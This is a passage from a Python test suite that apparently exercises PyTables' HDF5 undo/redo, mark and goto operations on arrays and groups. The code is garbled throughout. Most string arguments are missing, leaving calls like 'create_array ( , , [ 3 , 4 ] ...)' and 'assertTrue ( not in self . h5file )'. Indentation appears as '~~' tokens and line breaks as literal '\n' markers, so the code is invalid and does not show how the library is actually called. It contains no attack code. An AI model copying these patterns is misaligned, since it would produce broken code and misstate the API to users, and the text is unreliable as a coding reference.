# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array 1" ) \n 
self . h5file . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
\n 
# Put a mark \n 
self . h5file . mark ( ) \n 
self . _do_reopen ( ) \n 
self . h5file . create_array ( , , [ 5 , 6 ] , "Another array 3" ) \n 
self . h5file . create_array ( , , [ 6 , 7 ] , "Another array 4" ) \n 
\n 
# Unwind the previous mark \n 
self . h5file . undo ( ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
\n 
# Put a mark in the middle of stack \n 
if common . verbose : \n 
~~~ print ( "All nodes:" , self . h5file . walk_nodes ( ) ) \n 
~~ self . h5file . mark ( ) \n 
self . _do_reopen ( ) \n 
self . h5file . create_array ( , , [ 7 , 8 ] , "Another array 5" ) \n 
self . h5file . create_array ( , , [ 8 , 9 ] , "Another array 6" ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
self . assertTrue ( "/otherarray5" in self . h5file ) \n 
self . assertTrue ( "/otherarray6" in self . h5file ) \n 
\n 
# Unwind previous mark \n 
self . h5file . undo ( ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
self . assertTrue ( "/otherarray5" not in self . h5file ) \n 
self . assertTrue ( "/otherarray6" not in self . h5file ) \n 
\n 
# Redo until the last mark \n 
self . h5file . redo ( ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
self . assertTrue ( "/otherarray5" in self . h5file ) \n 
self . assertTrue ( "/otherarray6" in self . h5file ) \n 
\n 
# Redo until the next mark (non-existent, so no action) \n 
self . _do_reopen ( ) \n 
self . h5file . redo ( ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
self . assertTrue ( "/otherarray5" in self . h5file ) \n 
self . assertTrue ( "/otherarray6" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . read ( ) , [ 3 , 4 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . read ( ) , [ 4 , 5 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray5 . read ( ) , [ 7 , 8 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray6 . read ( ) , [ 8 , 9 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . title , "Another array 1" ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . title , "Another array 2" ) \n 
self . assertEqual ( self . h5file . root . otherarray5 . title , "Another array 5" ) \n 
self . assertEqual ( self . h5file . root . otherarray6 . title , "Another array 6" ) \n 
\n 
~~ def test05_destructive ( self ) : \n 
~~~ """Checking with a destructive action during undo.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test05_destructive..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array 1" ) \n 
\n 
# Put a mark \n 
self . h5file . mark ( ) \n 
self . _do_reopen ( ) \n 
self . h5file . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Do the destructive operation \n 
self . _do_reopen ( ) \n 
self . h5file . create_array ( , , [ 5 , 6 ] , "Another array 3" ) \n 
\n 
# Check objects \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . read ( ) , [ 3 , 4 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . title , "Another array 1" ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
self . assertTrue ( "/otherarray3" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray3 . read ( ) , [ 5 , 6 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray3 . title , "Another array 3" ) \n 
\n 
~~ def test05b_destructive ( self ) : \n 
~~~ """Checking with a destructive action during undo (II)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test05b_destructive..." % \n 
self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array 1" ) \n 
\n 
# Put a mark \n 
self . _do_reopen ( ) \n 
self . h5file . mark ( ) \n 
self . h5file . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Do the destructive operation \n 
self . h5file . create_array ( , , [ 5 , 6 ] , "Another array 3" ) \n 
\n 
# Put a mark \n 
self . _do_reopen ( ) \n 
self . h5file . mark ( ) \n 
self . h5file . create_array ( , , [ 6 , 7 ] , "Another array 4" ) \n 
self . assertTrue ( "/otherarray4" in self . h5file ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check objects \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . read ( ) , [ 3 , 4 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . title , "Another array 1" ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
self . assertTrue ( "/otherarray3" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray3 . read ( ) , [ 5 , 6 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray3 . title , "Another array 3" ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
\n 
~~ def test05c_destructive ( self ) : \n 
~~~ """Checking with a destructive action during undo (III)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test05c_destructive..." % \n 
self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array 1" ) \n 
\n 
# Put a mark \n 
self . h5file . mark ( ) \n 
self . _do_reopen ( ) \n 
self . h5file . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Do the destructive operation \n 
self . h5file . create_array ( , , [ 5 , 6 ] , "Another array 3" ) \n 
\n 
# Put a mark \n 
self . h5file . mark ( ) \n 
self . _do_reopen ( ) \n 
self . h5file . create_array ( , , [ 6 , 7 ] , "Another array 4" ) \n 
self . assertTrue ( "/otherarray4" in self . h5file ) \n 
\n 
# Now unwind twice \n 
self . h5file . undo ( ) \n 
self . _do_reopen ( ) \n 
self . h5file . undo ( ) \n 
\n 
# Check objects \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
\n 
~~ def test05d_destructive ( self ) : \n 
~~~ """Checking with a destructive action during undo (IV)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test05d_destructive..." % \n 
self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array 1" ) \n 
\n 
# Put a mark \n 
self . _do_reopen ( ) \n 
self . h5file . mark ( ) \n 
self . h5file . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Do the destructive operation \n 
self . h5file . create_array ( , , [ 5 , 6 ] , "Another array 3" ) \n 
\n 
# Put a mark \n 
self . h5file . mark ( ) \n 
self . h5file . create_array ( , , [ 6 , 7 ] , "Another array 4" ) \n 
self . assertTrue ( "/otherarray4" in self . h5file ) \n 
\n 
# Now, go to the first mark \n 
self . _do_reopen ( ) \n 
self . h5file . undo ( 0 ) \n 
\n 
# Check objects \n 
self . assertTrue ( "/otherarray1" not in self . h5file ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
\n 
~~ def test05e_destructive ( self ) : \n 
~~~ """Checking with a destructive action during undo (V)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test05e_destructive..." % \n 
self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array 1" ) \n 
\n 
# Put a mark \n 
self . h5file . mark ( ) \n 
self . h5file . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
self . _do_reopen ( ) \n 
\n 
# Do the destructive operation \n 
self . h5file . create_array ( , , [ 5 , 6 ] , "Another array 3" ) \n 
\n 
# Now, unwind the actions \n 
self . h5file . undo ( 0 ) \n 
self . _do_reopen ( ) \n 
\n 
# Check objects \n 
self . assertTrue ( "/otherarray1" not in self . h5file ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
\n 
~~ def test05f_destructive ( self ) : \n 
~~~ """Checking with a destructive creation of existing node during undo""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test05f_destructive..." % \n 
self . __class__ . __name__ ) \n 
\n 
~~ self . h5file . enable_undo ( ) \n 
self . h5file . create_array ( , , [ 1 ] ) \n 
self . h5file . undo ( ) \n 
self . _do_reopen ( ) \n 
self . assertTrue ( not in self . h5file ) \n 
newarr = self . h5file . create_array ( , , [ 1 ] ) \n 
self . h5file . undo ( ) \n 
self . assertTrue ( not in self . h5file ) \n 
self . _do_reopen ( ) \n 
self . h5file . redo ( ) \n 
self . assertTrue ( in self . h5file ) \n 
if not self . _reopen_flag : \n 
~~~ self . assertTrue ( self . h5file . root . newarray is newarr ) \n 
\n 
~~ ~~ def test06_totalunwind ( self ) : \n 
~~~ """Checking do/undo (total unwind)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test06_totalunwind..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array" ) \n 
self . h5file . mark ( ) \n 
self . h5file . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
\n 
# Now undo the past operations \n 
self . _do_reopen ( ) \n 
self . h5file . undo ( 0 ) \n 
self . assertTrue ( "/otherarray" not in self . h5file ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
\n 
~~ def test07_totalrewind ( self ) : \n 
~~~ """Checking do/undo (total rewind)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test07_totalunwind..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array" ) \n 
self . h5file . mark ( ) \n 
self . h5file . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
\n 
# Now undo the past operations \n 
self . h5file . undo ( 0 ) \n 
\n 
# Redo all the operations \n 
self . _do_reopen ( ) \n 
self . h5file . redo ( - 1 ) \n 
\n 
# Check that objects has come back to life in a sane state \n 
self . assertTrue ( "/otherarray" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray . read ( ) , [ 3 , 4 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . read ( ) , [ 4 , 5 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray . title , "Another array" ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . title , "Another array 2" ) \n 
\n 
~~ def test08_marknames ( self ) : \n 
~~~ """Checking mark names.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test08_marknames..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array 1" ) \n 
self . h5file . mark ( "first" ) \n 
self . h5file . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
self . h5file . mark ( "second" ) \n 
self . h5file . create_array ( , , [ 5 , 6 ] , "Another array 3" ) \n 
self . h5file . mark ( "third" ) \n 
self . h5file . create_array ( , , [ 6 , 7 ] , "Another array 4" ) \n 
\n 
# Now go to mark "first" \n 
self . h5file . undo ( "first" ) \n 
self . _do_reopen ( ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
\n 
# Go to mark "third" \n 
self . h5file . redo ( "third" ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
\n 
# Now go to mark "second" \n 
self . h5file . undo ( "second" ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
\n 
# Go to the end \n 
self . _do_reopen ( ) \n 
self . h5file . redo ( - 1 ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" in self . h5file ) \n 
self . assertTrue ( "/otherarray4" in self . h5file ) \n 
\n 
# Check that objects has come back to life in a sane state \n 
self . assertEqual ( self . h5file . root . otherarray1 . read ( ) , [ 3 , 4 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . read ( ) , [ 4 , 5 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray3 . read ( ) , [ 5 , 6 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray4 . read ( ) , [ 6 , 7 ] ) \n 
\n 
~~ def test08_initialmark ( self ) : \n 
~~~ """Checking initial mark.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test08_initialmark..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
initmid = self . h5file . get_current_mark ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array" ) \n 
self . h5file . mark ( ) \n 
self . _do_reopen ( ) \n 
self . h5file . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
\n 
# Now undo the past operations \n 
self . h5file . undo ( initmid ) \n 
self . assertTrue ( "/otherarray" not in self . h5file ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
\n 
# Redo all the operations \n 
self . h5file . redo ( - 1 ) \n 
self . _do_reopen ( ) \n 
\n 
# Check that objects has come back to life in a sane state \n 
self . assertTrue ( "/otherarray" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray . read ( ) , [ 3 , 4 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . read ( ) , [ 4 , 5 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray . title , "Another array" ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . title , "Another array 2" ) \n 
\n 
~~ def test09_marknames ( self ) : \n 
~~~ """Checking mark names (wrong direction)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test09_marknames..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array 1" ) \n 
self . h5file . mark ( "first" ) \n 
self . h5file . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
self . h5file . mark ( "second" ) \n 
self . _do_reopen ( ) \n 
self . h5file . create_array ( , , [ 5 , 6 ] , "Another array 3" ) \n 
self . h5file . mark ( "third" ) \n 
self . h5file . create_array ( , , [ 6 , 7 ] , "Another array 4" ) \n 
\n 
# Now go to mark "first" \n 
self . h5file . undo ( "first" ) \n 
\n 
# Try to undo up to mark "third" \n 
with self . assertRaises ( tables . UndoRedoError ) : \n 
~~~ self . h5file . undo ( "third" ) \n 
\n 
# Now go to mark "third" \n 
~~ self . h5file . redo ( "third" ) \n 
self . _do_reopen ( ) \n 
\n 
# Try to redo up to mark "second" \n 
with self . assertRaises ( tables . UndoRedoError ) : \n 
~~~ self . h5file . redo ( "second" ) \n 
\n 
# Final checks \n 
~~ self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
\n 
~~ def test10_goto ( self ) : \n 
~~~ """Checking mark names (goto)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test10_goto..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array 1" ) \n 
self . _do_reopen ( ) \n 
self . h5file . mark ( "first" ) \n 
self . h5file . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
self . h5file . mark ( "second" ) \n 
self . h5file . create_array ( , , [ 5 , 6 ] , "Another array 3" ) \n 
self . _do_reopen ( ) \n 
self . h5file . mark ( "third" ) \n 
self . h5file . create_array ( , , [ 6 , 7 ] , "Another array 4" ) \n 
\n 
# Now go to mark "first" \n 
self . h5file . goto ( "first" ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
\n 
# Go to mark "third" \n 
self . h5file . goto ( "third" ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
\n 
# Now go to mark "second" \n 
self . _do_reopen ( ) \n 
self . h5file . goto ( "second" ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
\n 
# Go to the end \n 
self . h5file . goto ( - 1 ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" in self . h5file ) \n 
self . assertTrue ( "/otherarray4" in self . h5file ) \n 
\n 
# Check that objects has come back to life in a sane state \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . read ( ) , [ 3 , 4 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . read ( ) , [ 4 , 5 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray3 . read ( ) , [ 5 , 6 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray4 . read ( ) , [ 6 , 7 ] ) \n 
\n 
~~ def test10_gotoint ( self ) : \n 
~~~ """Checking mark sequential ids (goto)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test10_gotoint..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array 1" ) \n 
self . h5file . mark ( "first" ) \n 
self . h5file . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
self . h5file . mark ( "second" ) \n 
self . _do_reopen ( ) \n 
self . h5file . create_array ( , , [ 5 , 6 ] , "Another array 3" ) \n 
self . h5file . mark ( "third" ) \n 
self . h5file . create_array ( , , [ 6 , 7 ] , "Another array 4" ) \n 
\n 
# Now go to mark "first" \n 
self . h5file . goto ( 1 ) \n 
self . _do_reopen ( ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
\n 
# Go to beginning \n 
self . h5file . goto ( 0 ) \n 
self . assertTrue ( "/otherarray1" not in self . h5file ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
\n 
# Go to mark "third" \n 
self . _do_reopen ( ) \n 
self . h5file . goto ( 3 ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
\n 
# Now go to mark "second" \n 
self . h5file . goto ( 2 ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
\n 
# Go to the end \n 
self . _do_reopen ( ) \n 
self . h5file . goto ( - 1 ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" in self . h5file ) \n 
self . assertTrue ( "/otherarray4" in self . h5file ) \n 
\n 
# Check that objects has come back to life in a sane state \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . read ( ) , [ 3 , 4 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . read ( ) , [ 4 , 5 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray3 . read ( ) , [ 5 , 6 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray4 . read ( ) , [ 6 , 7 ] ) \n 
\n 
~~ def test11_contiguous ( self ) : \n 
~~~ """Creating contiguous marks""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test11_contiguous..." % self . __class__ . __name__ ) \n 
\n 
~~ self . h5file . enable_undo ( ) \n 
m1 = self . h5file . mark ( ) \n 
m2 = self . h5file . mark ( ) \n 
self . assertNotEqual ( m1 , m2 ) \n 
self . _do_reopen ( ) \n 
self . h5file . undo ( m1 ) \n 
self . assertEqual ( self . h5file . get_current_mark ( ) , m1 ) \n 
self . h5file . redo ( m2 ) \n 
self . assertEqual ( self . h5file . get_current_mark ( ) , m2 ) \n 
self . h5file . goto ( m1 ) \n 
self . assertEqual ( self . h5file . get_current_mark ( ) , m1 ) \n 
self . h5file . goto ( m2 ) \n 
self . assertEqual ( self . h5file . get_current_mark ( ) , m2 ) \n 
self . h5file . goto ( - 1 ) \n 
self . _do_reopen ( ) \n 
self . assertEqual ( self . h5file . get_current_mark ( ) , m2 ) \n 
self . h5file . goto ( 0 ) \n 
self . assertEqual ( self . h5file . get_current_mark ( ) , 0 ) \n 
\n 
~~ def test12_keepMark ( self ) : \n 
~~~ """Ensuring the mark is kept after an UNDO operation""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test12_keepMark..." % self . __class__ . __name__ ) \n 
\n 
~~ self . h5file . enable_undo ( ) \n 
self . h5file . create_array ( , , [ 1 ] ) \n 
\n 
mid = self . h5file . mark ( ) \n 
self . assertTrue ( mid is not None ) \n 
self . _do_reopen ( ) \n 
self . h5file . undo ( ) \n 
\n 
# We should have moved to the initial mark. \n 
self . assertEqual ( self . h5file . get_current_mark ( ) , 0 ) \n 
\n 
# So /newarray1 should not be there. \n 
self . assertTrue ( not in self . h5file ) \n 
\n 
~~ def test13_severalEnableDisable ( self ) : \n 
~~~ """Checking that successive enable/disable Undo works""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test13_severalEnableDisable..." % \n 
self . __class__ . __name__ ) \n 
\n 
~~ self . h5file . enable_undo ( ) \n 
self . h5file . create_array ( , , [ 1 ] ) \n 
self . h5file . undo ( ) \n 
self . _do_reopen ( ) \n 
\n 
\n 
self . assertEqual ( self . h5file . get_current_mark ( ) , 0 ) \n 
\n 
# So /newarray1 should still be there. \n 
self . assertTrue ( not in self . h5file ) \n 
\n 
# Close this do/undo session \n 
self . h5file . disable_undo ( ) \n 
\n 
# Do something \n 
self . h5file . create_array ( , , [ 1 ] ) \n 
\n 
# Enable again do/undo \n 
self . h5file . enable_undo ( ) \n 
self . h5file . create_array ( , , [ 1 ] ) \n 
mid = self . h5file . mark ( ) \n 
self . h5file . create_array ( , , [ 1 ] ) \n 
self . h5file . undo ( ) \n 
\n 
\n 
self . assertEqual ( self . h5file . get_current_mark ( ) , mid ) \n 
\n 
# So /newarray2 and /newarray3 should still be there. \n 
self . assertTrue ( not in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( not in self . h5file ) \n 
\n 
# Close this do/undo session \n 
self . _do_reopen ( ) \n 
self . h5file . disable_undo ( ) \n 
\n 
# Enable again do/undo \n 
self . h5file . enable_undo ( ) \n 
self . h5file . create_array ( , , [ 1 ] ) \n 
self . h5file . create_array ( , , [ 1 ] ) \n 
\n 
# So /newarray2 and /newarray3 should still be there. \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
self . h5file . undo ( ) \n 
self . _do_reopen ( ) \n 
self . assertTrue ( not in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( in self . h5file ) \n 
self . assertTrue ( not in self . h5file ) \n 
\n 
# Close this do/undo session \n 
self . h5file . disable_undo ( ) \n 
\n 
\n 
~~ ~~ class PersistenceTestCase ( BasicTestCase ) : \n 
~~~ """Test for basic Undo/Redo operations with persistence.""" \n 
\n 
_reopen_flag = True \n 
\n 
\n 
~~ class CreateArrayTestCase ( common . TempFileMixin , TestCase ) : \n 
~~~ """Test for create_array operations""" \n 
\n 
def setUp ( self ) : \n 
~~~ super ( CreateArrayTestCase , self ) . setUp ( ) \n 
\n 
h5file = self . h5file \n 
root = h5file . root \n 
\n 
# Create an array \n 
h5file . create_array ( root , , [ 1 , 2 ] , title = "Title example" ) \n 
\n 
# Create another array object \n 
h5file . create_array ( root , , [ 1 ] , "Array title" ) \n 
\n 
# Create a group object \n 
group = h5file . create_group ( root , , "Group title" ) \n 
\n 
# Create a couple of objects there \n 
h5file . create_array ( group , , [ 2 ] , "Array title 1" ) \n 
h5file . create_array ( group , , [ 2 ] , "Array title 2" ) \n 
\n 
# Create a lonely group in first level \n 
h5file . create_group ( root , , "Group title 2" ) \n 
\n 
# Create a new group in the second level \n 
h5file . create_group ( group , , "Group title 3" ) \n 
\n 
~~ def test00 ( self ) : \n 
~~~ """Checking one action.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test00..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 1 , 2 ] , "Another array 1" ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that otherarray does not exist in the object tree \n 
self . assertTrue ( "/otherarray1" not in self . h5file ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that otherarray has come back to life in a sane state \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . title , "Another array 1" ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . read ( ) , [ 1 , 2 ] ) \n 
\n 
~~ def test01 ( self ) : \n 
~~~ """Checking two actions.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test01..." % self . __class__ . __name__ ) \n 
\n 
